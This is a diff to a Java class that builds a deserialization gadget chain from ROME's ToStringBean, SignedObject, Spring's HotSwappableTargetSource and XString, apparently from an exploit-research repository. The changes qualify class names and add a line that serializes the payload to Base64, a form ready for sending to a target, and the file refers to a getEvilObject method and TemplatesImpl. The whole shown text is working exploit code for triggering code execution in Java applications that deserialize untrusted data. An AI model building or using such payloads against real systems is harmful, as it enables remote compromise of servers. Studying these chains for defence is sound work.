@@ -3,11 +3,9 @@ package SignedObject;
 import Utils.ReflectUtils;
 import Utils.SerialUtils;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xpath.internal.objects.XString;
 import com.sun.syndication.feed.impl.EqualsBean;
 import com.sun.syndication.feed.impl.ToStringBean;
-import org.springframework.aop.target.HotSwappableTargetSource;
 
 import javax.xml.transform.Templates;
 import java.nio.file.Files;
@@ -30,8 +28,8 @@ public class ROMEHotSwappableTargetSource {
 
         ToStringBean toStringBean = new ToStringBean(SignedObject.class,signedObject);
 
-        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
-        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("jasper"));
+        org.springframework.aop.target.HotSwappableTargetSource h1 = new org.springframework.aop.target.HotSwappableTargetSource(toStringBean);
+        org.springframework.aop.target.HotSwappableTargetSource h2 = new org.springframework.aop.target.HotSwappableTargetSource(new XString("jasper"));
 
         HashMap<Object,Object> hashMap = new HashMap<>();
         hashMap.put(h1,h1);
@@ -39,6 +37,7 @@ public class ROMEHotSwappableTargetSource {
 
         SerialUtils.serialize(hashMap);
         SerialUtils.unserialize();
+        SerialUtils.serializeB64(hashMap);
     }
     // here can be CC object or others need to deserialize.
     public static Object getEvilObject()throws Exception {
